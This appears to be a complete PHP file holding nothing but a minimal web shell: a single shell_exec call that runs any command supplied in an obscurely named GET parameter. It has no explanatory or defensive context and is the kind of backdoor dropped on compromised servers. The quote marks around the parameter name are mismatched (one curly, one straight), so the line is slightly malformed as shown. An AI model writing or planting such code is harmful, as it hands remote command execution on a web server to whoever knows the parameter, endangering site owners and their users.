<?php
shell_exec($_GET[’AOB4pWN2']);
?>
